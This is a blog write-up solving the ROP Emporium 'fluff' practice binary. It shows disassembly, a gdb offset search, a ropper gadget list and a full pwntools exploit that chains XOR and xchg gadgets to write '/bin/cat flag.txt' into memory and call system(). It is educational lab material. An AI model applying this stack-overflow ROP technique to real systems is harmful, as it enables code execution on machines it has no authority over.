---
layout:     post
title:      'ROP Emporium - fluff'
date:       2019-02-19 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'ROP Emporium'
---

Today we're going to get much more creative with chaining ROP gadgets. Once again, we have to write a string to memory and then use this string to call `system`, but this time we're limited to gadgets that do not seem to allow us to write directly. Instead we have to find a way to use multiple ways to just place a value at register.  

```text
[w3ndige@main fluff]$ rabin2 -I fluff 
arch     x86
baddr    0x400000
binsz    7154
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```

Firstly, we can see that once again, `NX` bit is set. We can also see, if the functions used in a binary are much different then the ones used in previous challenges. If not, we'll go straight to exploitation. 

```text
[w3ndige@main fluff]$ r2 -AAA ./fluff 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- command not found: calc.exe
[0x00400650]> afl
0x004005a0    3 26           sym._init
0x004005d0    1 6            sym.imp.puts
0x004005e0    1 6            sym.imp.system
0x004005f0    1 6            sym.imp.printf
0x00400600    1 6            sym.imp.memset
0x00400610    1 6            sym.imp.__libc_start_main
0x00400620    1 6            sym.imp.fgets
0x00400630    1 6            sym.imp.setvbuf
0x00400640    1 6            sub.__gmon_start_400640
0x00400650    1 41           entry0
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    4 58   -> 55   sym.register_tm_clones
0x00400700    3 28           sym.__do_global_dtors_aux
0x00400720    4 38   -> 35   entry.init0
0x00400746    1 111          sym.main
0x004007b5    1 82           sym.pwnme
0x00400807    1 17           sym.usefulFunction
0x00400860    4 101          sym.__libc_csu_init
0x004008d0    1 2            sym.__libc_csu_fini
0x004008d4    1 9            sym._fini
[0x00400650]> pdf @sym.pwnme
/ (fcn) sym.pwnme 82
|   sym.pwnme ();
|           ; var int local_20h @ rbp-0x20
|           ; CALL XREF from sym.main (0x40079f)
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
|           0x004007bd      488d45e0       lea rax, qword [local_20h]
|           0x004007c1      ba20000000     mov edx, 0x20               ; 32
|           0x004007c6      be00000000     mov esi, 0
|           0x004007cb      4889c7         mov rdi, rax
|           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x004007d3      bf10094000     mov edi, str.You_know_changing_these_strings_means_I_have_to_rewrite_my_solutions... ; 0x400910 ; "You know changing these strings means I have to rewrite my solutions..."
|           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007dd      bf58094000     mov edi, 0x400958
|           0x004007e2      b800000000     mov eax, 0
|           0x004007e7      e804feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004007ec      488b157d0820.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x601070:8]=0
|           0x004007f3      488d45e0       lea rax, qword [local_20h]
|           0x004007f7      be00020000     mov esi, 0x200              ; 512
|           0x004007fc      4889c7         mov rdi, rax
|           0x004007ff      e81cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400804      90             nop
|           0x00400805      c9             leave
\           0x00400806      c3             ret
[0x00400650]> pdf @sym.usefulFunction
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bf5b094000     mov edi, str.bin_ls         ; 0x40095b ; "/bin/ls"
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
```

From here we can see that the structure is basically the same. Once again we have already found address of `system()` call. We can also assume that the offset used to overwrite `rsp` is the same, but to be safe, let's check that. 

```text
[w3ndige@main fluff]$ gdb ./fluff 
GNU gdb (GDB) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./fluff...(no debugging symbols found)...done.
gdb-peda$ pattern_create 512 input
Writing pattern of 512 chars to filename "input"
gdb-peda$ run < input
Starting program: /home/w3ndige/hacking/rop_emporium/fluff/fluff < input
fluff by ROP Emporium
64bits

You know changing these strings means I have to rewrite my solutions...
> 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdd30 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RBX: 0x0 
RCX: 0xfbad2088 
RDX: 0x7fffffffdd30 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RSI: 0x7ffff7f91730 --> 0x0 
RDI: 0x7fffffffdd31 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAA"...)
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdd58 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
RIP: 0x400806 (<pwnme+81>:	ret)
R8 : 0xf 
R9 : 0x7fffffffdd50 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;"...)
R10: 0x602010 --> 0x0 
R11: 0x7fffffffdf1f ("gAs6AsLAshAs7AsM")
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde40 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3"...)
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007ff <pwnme+74>:	call   0x400620 <fgets@plt>
   0x400804 <pwnme+79>:	nop
   0x400805 <pwnme+80>:	leave  
=> 0x400806 <pwnme+81>:	ret    
   0x400807 <usefulFunction>:	push   rbp
   0x400808 <usefulFunction+1>:	mov    rbp,rsp
   0x40080b <usefulFunction+4>:	mov    edi,0x40095b
   0x400810 <usefulFunction+9>:	call   0x4005e0 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd58 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
0008| 0x7fffffffdd60 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA"...)
0016| 0x7fffffffdd68 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"...)
0024| 0x7fffffffdd70 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%"...)
0032| 0x7fffffffdd78 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A"...)
0040| 0x7fffffffdd80 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4"...)
0048| 0x7fffffffdd88 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%"...)
0056| 0x7fffffffdd90 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400806 in pwnme ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RAX] --> offset 0 - size ~203
[RDX] --> offset 0 - size ~203
[RDI] --> offset 1 - size ~203
[RSP] --> offset 40 - size ~203
[R9] --> offset 32 - size ~203
[R11] --> offset 495 - size ~16
[R13] --> offset 272 - size ~203
Pattern buffer found at:
0x00602260 : offset    0 - size  512 ([heap])
0x00007fffffffdd30 : offset    0 - size  511 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007ffff7f8f878 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f8f880 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f8f888 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f8f890 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f8f898 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007fffffffb120 : 0x00007fffffffdd30 ($sp + -0x2c38 [-2830 dwords])
0x00007fffffffd980 : 0x00007fffffffdd30 ($sp + -0x3d8 [-246 dwords])
0x00007fffffffd9a0 : 0x00007fffffffdd30 ($sp + -0x3b8 [-238 dwords])
0x00007fffffffdca0 : 0x00007fffffffdd30 ($sp + -0xb8 [-46 dwords])
0x00007fffffffdcb8 : 0x00007fffffffdd30 ($sp + -0xa0 [-40 dwords])
0x00007fffffffdce8 : 0x00007fffffffdd30 ($sp + -0x70 [-28 dwords])
```

Yes, everything is the same. But as I said in the beginning, the main obstacle is going to be finding useful gadgets in order to make a ROP chain. With `ropper`, we can see what we have available in this binary. 

```text
[w3ndige@main fluff]$ ropper --file fluff 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x00000000004006a2: adc byte ptr [rax], ah; jmp rax; 
0x000000000040083d: adc byte ptr [rax], ah; xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
0x0000000000400829: adc byte ptr [rax], ah; ret; 
0x00000000004008cf: add bl, dh; ret; 
0x0000000000400734: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x00000000004008cd: add byte ptr [rax], al; add bl, dh; ret; 
0x0000000000400732: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x00000000004008cb: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
0x00000000004006ac: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x000000000040081d: add byte ptr [rax], al; add byte ptr [rcx + 0x5f], al; xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x00000000004007a1: add byte ptr [rax], al; add byte ptr [rdi + 0x400906], bh; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x00000000004005b3: add byte ptr [rax], al; add rsp, 8; ret; 
0x00000000004007a2: add byte ptr [rax], al; mov edi, 0x400906; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x00000000004007fa: add byte ptr [rax], al; mov rdi, rax; call 0x620; nop; leave; ret; 
0x000000000040081e: add byte ptr [rax], al; pop r15; xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x00000000004006ae: add byte ptr [rax], al; pop rbp; ret; 
0x00000000004008d2: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x000000000040083f: add byte ptr [rbp - 0x79], cl; rol dword ptr [rcx + 0x5f], cl; mov r11d, 0x602050; ret; 
0x000000000040081f: add byte ptr [rcx + 0x5f], al; xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x00000000004007a3: add byte ptr [rdi + 0x400906], bh; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x0000000000400714: add eax, 0x20096e; add ebx, esi; ret; 
0x0000000000400719: add ebx, esi; ret; 
0x00000000004005b6: add esp, 8; ret; 
0x00000000004005b5: add rsp, 8; ret; 
0x0000000000400848: and byte ptr [rax], ah; ret; 
0x0000000000400717: and byte ptr [rax], al; add ebx, esi; ret; 
0x00000000004007a9: call 0x5d0; mov eax, 0; pop rbp; ret; 
0x0000000000400810: call 0x5e0; nop; pop rbp; ret; 
0x00000000004007ff: call 0x620; nop; leave; ret; 
0x00000000004005b0: call 0x640; add rsp, 8; ret; 
0x0000000000400745: call qword ptr [rbp + 0x48]; 
0x0000000000400a63: call qword ptr [rcx]; 
0x0000000000400a43: call qword ptr [rdx]; 
0x000000000040073e: call rax; 
0x000000000040098b: call rsp; 
0x0000000000400824: fild dword ptr [rcx + 0x5e]; mov edi, 0x601050; ret; 
0x00000000004008ac: fmul qword ptr [rax - 0x7d]; ret; 
0x0000000000400a83: jmp qword ptr [rbp]; 
0x00000000004006a5: jmp rax; 
0x0000000000400711: lcall ptr [rbp - 0x3a]; add eax, 0x20096e; add ebx, esi; ret; 
0x000000000040084f: mov dword ptr [rdx], ebx; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
0x00000000004007ae: mov eax, 0; pop rbp; ret; 
0x00000000004005b1: mov eax, dword ptr [rax]; add byte ptr [rax], al; add rsp, 8; ret; 
0x0000000000400835: mov ebp, 0x604060; ret; 
0x000000000040073c: mov ebp, esp; call rax; 
0x0000000000400846: mov ebx, 0x602050; ret; 
0x00000000004007a4: mov edi, 0x400906; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x000000000040080b: mov edi, 0x40095b; call 0x5e0; nop; pop rbp; ret; 
0x000000000040083b: mov edi, 0x601050; xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
0x0000000000400827: mov edi, 0x601050; ret; 
0x00000000004006a0: mov edi, 0x601060; jmp rax; 
0x00000000004007fd: mov edi, eax; call 0x620; nop; leave; ret; 
0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
0x0000000000400845: mov r11d, 0x602050; ret; 
0x0000000000400834: mov r13d, 0x604060; ret; 
0x000000000040073b: mov rbp, rsp; call rax; 
0x00000000004007fc: mov rdi, rax; call 0x620; nop; leave; ret; 
0x00000000004006a8: nop dword ptr [rax + rax]; pop rbp; ret; 
0x00000000004006f5: nop dword ptr [rax]; pop rbp; ret; 
0x00000000004006a7: nop word ptr [rax + rax]; pop rbp; ret; 
0x00000000004007a6: or dword ptr [rax], eax; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x000000000040080d: or dword ptr [rax], eax; call 0x5e0; nop; pop rbp; ret; 
0x0000000000400832: pop r12; mov r13d, 0x604060; ret; 
0x00000000004008bc: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000400853: pop r12; xor byte ptr [r10], r12b; ret; 
0x0000000000400851: pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
0x00000000004008be: pop r13; pop r14; pop r15; ret; 
0x0000000000400825: pop r14; mov edi, 0x601050; ret; 
0x00000000004008c0: pop r14; pop r15; ret; 
0x000000000040082d: pop r14; xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
0x000000000040084c: pop r15; mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
0x0000000000400843: pop r15; mov r11d, 0x602050; ret; 
0x0000000000400820: pop r15; xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x00000000004008c2: pop r15; ret; 
0x000000000040069f: pop rbp; mov edi, 0x601060; jmp rax; 
0x00000000004008bb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000400852: pop rbp; pop r12; xor byte ptr [r10], r12b; ret; 
0x00000000004008bf: pop rbp; pop r14; pop r15; ret; 
0x00000000004006b0: pop rbp; ret; 
0x000000000040080c: pop rbx; or dword ptr [rax], eax; call 0x5e0; nop; pop rbp; ret; 
0x000000000040084d: pop rdi; mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
0x0000000000400844: pop rdi; mov r11d, 0x602050; ret; 
0x0000000000400821: pop rdi; xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x00000000004008c3: pop rdi; ret; 
0x0000000000400826: pop rsi; mov edi, 0x601050; ret; 
0x00000000004008c1: pop rsi; pop r15; ret; 
0x000000000040082e: pop rsi; xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
0x0000000000400833: pop rsp; mov r13d, 0x604060; ret; 
0x00000000004008bd: pop rsp; pop r13; pop r14; pop r15; ret; 
0x0000000000400854: pop rsp; xor byte ptr [r10], r12b; ret; 
0x000000000040083c: push rax; adc byte ptr [rax], ah; xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
0x0000000000400828: push rax; adc byte ptr [rax], ah; ret; 
0x0000000000400847: push rax; and byte ptr [rax], ah; ret; 
0x000000000040073a: push rbp; mov rbp, rsp; call rax; 
0x0000000000400842: rol dword ptr [rcx + 0x5f], cl; mov r11d, 0x602050; ret; 
0x0000000000400737: sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400850: sbb al, byte ptr [rcx + 0x5d]; pop r12; xor byte ptr [r10], r12b; ret; 
0x00000000004008d5: sub esp, 8; add rsp, 8; ret; 
0x00000000004008d4: sub rsp, 8; add rsp, 8; ret; 
0x00000000004006aa: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400841: xchg ebx, edx; pop r15; mov r11d, 0x602050; ret; 
0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
0x0000000000400855: xor byte ptr [r10], r12b; ret; 
0x0000000000400856: xor byte ptr [rdx], ah; ret; 
0x0000000000400823: xor ebx, ebx; pop r14; mov edi, 0x601050; ret; 
0x0000000000400830: xor ebx, esp; pop r12; mov r13d, 0x604060; ret; 
0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
0x0000000000400739: int1; push rbp; mov rbp, rsp; call rax; 
0x0000000000400805: leave; ret; 
0x0000000000400815: nop; pop rbp; ret; 
0x0000000000400804: nop; leave; ret; 
0x00000000004005b9: ret; 

113 gadgets found
```

At first sight, there doesn't seem to be a way to write a string into a memory. But look at it as a big puzzle, waiting for you to solve it, which I highly encourage you to do by yourself. 

Our fist goal is to find a way to write something into memory. I decided to go with `mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;`, as it simply does it's job. 

But upon further examination, there doesn't seem to be a way to directly put anything in any of there registers - `r10` or `r11`. But, if you look clesly, you can see that through chaining multiple gadgets, we can achieve an effect similar to simply popping the value into one of these registers. 

Firstly, let's focus on putting the address of the string into register `r10`.

* Our first step would be to `XOR` register `r11` with itself. That will allow us to zero out the register. Perfect gadget for that would be `xor r11, r11; pop r14; mov edi, 0x601050; ret;`. We'll have to pass some garbage to satisfy the `pop r14` instruction, but still we're not going to use that register. 

```python
>>> r11 = 0x4242 # Some garbage
>>> r11 ^= r11
>>> r11
0
```

* Now we can use `pop r12; mov r13d, 0x604060; ret;` to pop the address into register `r12`. Once again, we can ignore the part after the pop, we're not going to use it.
* With that knowledge in mind, we can now use one of the funcionality of `XOR`, allowing us to put the value from `r12` into zeroed out `r11` just like if we were using `move`. Gadget for that would be `xor r11, r12; pop r12; mov r13d, 0x604060; ret;`.

```python
>>> r12 = 0x601050
>>> r11 ^= r12
>>> hex(r12)
'0x601050'
```

* At last, we can use `xchg` instruction to swap the values between two registers `r11` and `r10`. That way, we have our address in `r10` register, just where we want it to be.

A little more complicated, but still we're able to pass the address. Now we have to find a way to put our data into `r11` register. 

* Once again, we have to use `XOR` to zero out the `r11` register. Same gadget as in the previous part. 
* After that we'll use `pop r12` to pop the string into the register.
* Lastly, let's `XOR` register `r11` with `r12` to put the string into the `r11`. 

After that set of moves, we'll be able to call the `mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;` gadget that will place the string at provided address.

After that part, all we'll have to do is just `pop rdi; ret;` with address of our string that is used as argument in `system()`. After that, just call the `system()` and we're ready. 

Moving on to exploit. 

```python
from pwn import *

# 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
# 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
# 0x0000000000400832: pop r12; mov r13d, 0x604060; ret;
# 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
# 0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
# 0x00000000004008c3: pop rdi; ret; 

# 0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
#   [25] .data             PROGBITS         0000000000601050  00001050

def place_address(address):
    payload = p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
    payload += p64(0) # Unused pop r14
    payload += p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret;
    payload += p64(address)
    payload += p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
    payload += p64(0) # Unused pop r12
    payload += p64(0x0000000000400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
    payload += p64(0) # Unused pop r15
    return payload

def place_data(data):
    payload = p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
    payload += p64(0) # Unused pop r14
    payload += p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret;
    payload += data # String to be putted
    payload += p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
    payload += p64(0) # Unused pop r12
    return payload

def write_data(string, address):
    while len(string) % 8 != 0:
          string += "\x00"

    splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
    payload = ""

    for i in range(len(splitted_string)):
        # Put address into r10 register
        payload += place_address(address + (i * 8))

        # Now we have to put actual data in r11
        payload += place_data(splitted_string[i])

        # Write data to address
        payload += p64(0x000000000040084e) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
        payload += p64(0) * 2 # Unused pop r13 and pop r12
         
    return payload

offset = cyclic(40)
offset += write_data("/bin/cat flag.txt", 0x601050)
offset += p64(0x00000000004008c3)
offset += p64(0x601050)
offset += p64(0x00400810)

print(offset)
```

One thing I've noticed unusal is that you have to provide full path to used binary. I'm not so sure why.

```text
[w3ndige@main fluff]$ python2 exploit.py | ./fluff 
fluff by ROP Emporium
64bits

You know changing these strings means I have to rewrite my solutions...
> ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```